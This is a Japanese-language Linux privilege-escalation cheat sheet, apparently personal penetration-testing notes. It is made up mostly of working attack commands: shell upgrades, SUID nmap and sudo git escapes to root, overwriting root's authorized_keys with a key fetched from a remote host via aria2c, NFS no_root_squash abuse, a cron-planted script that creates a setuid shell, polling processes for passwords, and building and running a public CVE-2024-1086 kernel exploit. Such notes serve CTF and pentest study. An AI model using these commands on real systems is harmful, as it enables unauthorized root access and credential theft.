## 目次

1. [TTY Shell](#tty-shell)
2. [権限エスカレーションの調査](#権限エスカレーションの調査)
- [今のユーザーで実行可能なsudo権限の一覧](#今のユーザーで実行可能な-sudo-権限の一覧)
- [誰でも書き込み可能なファイルの調査](#誰でも書き込み可能なファイルの調査)
- [`setuid`ビットがセットされたファイルの調査](#setuidビットがセットされたファイルの調査)
  - [Nmapでの対話モードを使用した権限昇格](#nmapでの対話モードを使用した権限昇格)
- [書き込み可能なディレクトリの調査](#書き込み可能なディレクトリの調査)
- [サーバの待受けサービスの調査](#サーバの待受けサービスの調査)
- [任意のコマンドを用いて調査](#任意のコマンドを用いて調査)
- [Debianシステムでインストールされているアプリケーション一覧](#debianシステムでインストールされているアプリケーション一覧)
- [`sudo`を使ったGitの設定ヘルプの表示](#sudoを使ったgitの設定ヘルプの表示)
- [`aria2c`（ファイルの並列ダウンロード）コマンドを使用したファイルの上書き](#aria2cファイルの並列ダウンロードコマンドを使用したファイルの上書き)
- [マウントされたドライブの一覧](#マウントされたドライブの一覧)
- [すべての利用可能なドライブの一覧](#すべての利用可能なドライブの一覧)
- [読み込まれているドライバの一覧](#読み込まれているドライバの一覧)
- [参考サイト](#参考サイト)
3. [Mountable Shares](#mountable-shares)
   - [ターゲット上の共有ディレクトリを確認](#ターゲット上の共有ディレクトリを確認)
   - [攻撃者側で共有ディレクトリの一覧を表示](#攻撃者側で共有ディレクトリの一覧を表示)
   - [共有ディレクトリをマウント](#共有ディレクトリをマウント)
   - [バイナリの作成と実行権限の付与](#バイナリの作成と実行権限の付与)
4. [Cron Job](#cron-job)
   - [/etc/crontabファイルの内容を表示](#/etc/crontabファイルの内容を表示)
   - [現在のユーザーのCronジョブを表示](#現在のユーザーのcronジョブを表示)
   - [pspyツールの利用](#pspyツールの利用)
   - [Pythonで書かれているファイルに付与する例](#pythonで書かれているファイルに付与する例)
5. [Sensitive Information](#sensitive-information)
   - [環境変数の確認](#環境変数の確認)
   - [プロセスの監視](#プロセスの監視)
   - [PSPYツールの活用](#pspyツールの活用)
6. [Automated Scripts](#automated-scripts)
   - [Linux特権昇格ツールとリソース](#linux特権昇格ツールとリソース)
     - [linPEAS.sh](#linpeas.sh)
     - [LinEnum.sh](#linenum.sh)
     - [linuxprivchecker.py](#linuxprivchecker.py)
     - [unix-privesc-check](#unix-privesc-check)
     - [Metasploit: multi/recon/local_exploit_suggester](#metasploit-multireconlocal_exploit_suggester)
7. [既知の脆弱性を利用する](#既知の脆弱性を利用する)
   - [CVE-2024-1086](#cve-2024-1086)
     - [musl-gccのインストール](#musl-gccのインストール)
     - [PoCのインストール](#pocのインストール)
     - [PoCの実行](#pocの実行)




## TTY Shell
- `python -c 'import pty; pty.spawn("/bin/bash")'`
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `echo 'os.system('/bin/bash')'`
- `/bin/sh -i`
- `perl -e 'exec "/bin/sh";'`
---

## 権限エスカレーションの調査

### 今のユーザーで実行可能な`sudo`権限の一覧
```bash
sudo -l
```

### 誰でも書き込み可能なファイルの調査
```bash
find / -perm -o+w -type f 2>/dev/null | grep /proc -v
```

### `setuid`ビットがセットされたファイルの調査
```bash
find / -type f -perm -4000 2>/dev/null
```
- `setuid`ビット: 実行時に所有者の権限で実行されるファイル

#### Nmapでの対話モードを使用した権限昇格
`nmap`に`setuid`ビットが設定されており、`root`権限で実行可能な場合、対話モードを利用して`root`権限を取得できます。以下はその手順です。
1. `nmap`を対話モードで起動します。
```bash
/usr/local/bin/nmap --interactive
```
2. 対話モードに入ると、以下のメッセージが表示されます。
```plaintext
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
```
3. 対話モードでシェルを起動します。
```plaintext
nmap> !sh
```
4. これで`root`権限のシェルにアクセスできます。`whoami`コマンドで確認します。
```bash
# whoami
root
```

### 書き込み可能なディレクトリの調査
```bash
find / -writable -type d 2>/dev/null
```
### サーバの待受けサービスの調査
```bash
netstat -ltunp
```
### 任意のコマンドを用いて調査
```bash
find * -exec bash -p \;
```

### Debianシステムでインストールされているアプリケーション一覧
```bash
dpkg -l
```

### `sudo`を使ったGitの設定ヘルプの表示
```bash
sudo git -p help config
```
- シェルに入るための省略コマンド: `!/bin/sh`

### `aria2c`（ファイルの並列ダウンロード）コマンドを使用したファイルの上書き

```bash
aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.0.99:8000/id_rsa.pub" --allow-overwrite=true
```

### マウントされたドライブの一覧
```bash
cat /etc/fstab
```

### すべての利用可能なドライブの一覧
```bash
lsblk
```

### 読み込まれているドライバの一覧
```bash
lsmod
```

## 参考サイト
- [GTFObins - 各種ファイル等を利用した権限昇格サイト](https://gtfobins.github.io/)

---
## Mountable Shares

### ターゲット上の共有ディレクトリを確認
```bash
cat /etc/exports
```

### 攻撃者側で共有ディレクトリの一覧を表示
```bash
showmount -e <target IP>
```
- 出力の中に`"no_root_squash"`が含まれているか確認します。

### 共有ディレクトリをマウント
```bash
mount -o rw <targetIP>:<share-location> <directory path we created>
```

### バイナリの作成と実行権限の付与
```bash
chmod +x <binary>
```

## Cron Job
Cronジョブを確認するために、以下のコマンドを使用します。

#### `/etc/crontab`ファイルの内容を表示
```bash
cat /etc/crontab
```

#### 現在のユーザーのCronジョブを表示
```bash
crontab -l
```

#### pspyツールの利用
`pspy`は、Linux上でリアルタイムに発生しているアクティビティを監視するための便利なツールです。
---
### Pythonで書かれているファイルに付与する例

以下のPythonコードを実行した後、`./sh`を実行します。

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('cp /bin/sh /tmp/sh ')
        os.system('chmod u+s /tmp/sh ')
except:
        sys.exit()
```
このコードは、`/bin/sh`を`/tmp/sh`にコピーし、`setuid`ビットを設定することで、`/tmp/sh`を実行するときに所有者の権限で実行されるようにします。
---

## Sensitive Infomation
## 環境変数とプロセス監視による情報収集

### 1. 環境変数の確認
環境変数には、システムやユーザーに関するさまざまな情報が含まれており、セキュリティ上の脆弱性につながることがあります。以下のコマンドで環境変数を確認します。

```bash
cat .bashrc
env
```

### 2. プロセスの監視
定期的にシステム内のプロセスを監視することで、実行中のプロセスから機密情報を収集することが可能です。特に、資格情報が含まれているプロセスを監視する場合、以下のコマンドを使用します。

```bash
watch -n 1 "ps -aux | grep pass"
```

このコマンドは1秒ごとにシステム内のプロセスをチェックし、`pass`というキーワードが含まれているプロセスを表示します。これにより、ユーザーのパスワードや他の資格情報が含まれているプロセスをリアルタイムで監視することができます。

### 3. PSPYツールの活用
プロセスに関連する情報は、`PSPY`というツールを使ってより詳細に監視・収集することも可能です。`PSPY`はLinux環境でのプロセス監視を支援する便利なツールです。
---

## Automated Scripts
### Linux特権昇格ツールとリソース

### 1. linPEAS.sh
`linPEAS.sh`は、Linuxシステムでの特権昇格の可能性を調査するためのスクリプトです。様々なチェックを自動的に行い、脆弱性を発見します。

### 2. LinEnum.sh
`LinEnum.sh`は、Linux環境での特権昇格を支援するためのスクリプトです。システムの構成情報を収集し、特権昇格に利用可能な脆弱性を特定します。

- GitHubリポジトリ: [LinEnum](https://github.com/rebootuser/LinEnum)
- 仕組みの解説: [note.com - LinEnum解説](https://note.com/pien2021/n/n6c7766eb0e9e)

### 3. linuxprivchecker.py
`linuxprivchecker.py`は、Linuxシステムで特権昇格を検出するために使用されるPythonスクリプトです。システムの設定やファイルの権限に関する情報をチェックし、潜在的な脆弱性を報告します。

### 4. unix-privesc-check
`unix-privesc-check`は、UNIX/Linuxシステムで特権昇格の可能性を評価するためのスクリプトです。特定の設定やファイルの誤設定に焦点を当て、システム管理者が見落としがちな部分を検出します。

### 5. Metasploit: multi/recon/local_exploit_suggester
Metasploitフレームワーク内の`multi/recon/local_exploit_suggester`モジュールは、ターゲットシステムでの特権昇格に利用できるローカルエクスプロイトを提案します。このモジュールは、ターゲットシステム上の既知の脆弱性を分析し、適切なエクスプロイトを推奨します。
---


## 既知の脆弱性を利用する
#### CVE-2024-1086
CVE-2024-1086に関する詳細情報は以下のリンクから確認できます。
##### 脆弱性の概要
[CVE-2024-1086](https://www.cve.org/CVERecord?id=CVE-2024-1086)

---

##### musl-gccのインストール

以下の手順で`musl-gcc`をインストールします。`musl-gcc`は、Musl libc向けのGCCコンパイラです。

```bash
sudo apt update
sudo apt install musl-tools
```

---

##### PoCのインストール

次に、CVE-2024-1086のPoC（概念実証）をインストールします。

```bash
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

---

##### PoCの実行

インストール後、以下のコマンドでPoCを実行します。

```bash
./exploit
```

